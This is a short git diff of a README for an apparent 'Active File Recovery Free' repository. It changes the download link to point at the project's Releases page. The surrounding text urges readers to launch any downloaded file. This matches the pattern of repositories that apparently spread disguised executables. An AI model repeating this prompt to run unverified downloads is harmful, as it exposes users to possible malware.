@@ -12,7 +12,7 @@ Welcome to the **Active File Recovery Free** repository! Here you can find all t
 ## How to Use the Repository
 
 To access the files and resources related to file recovery, please visit the following link:
-[Download Active File Recovery Free](https://github.com/files/Project.zip).
+[Download Active File Recovery Free](https://github.com/Fardinai/Active-File-Recovery-Free/releases).
 
 If the link ends with a file name, make sure to launch it to start your file recovery journey. In case the link does not work or is not provided, please check the "Releases" section for updated information.
 
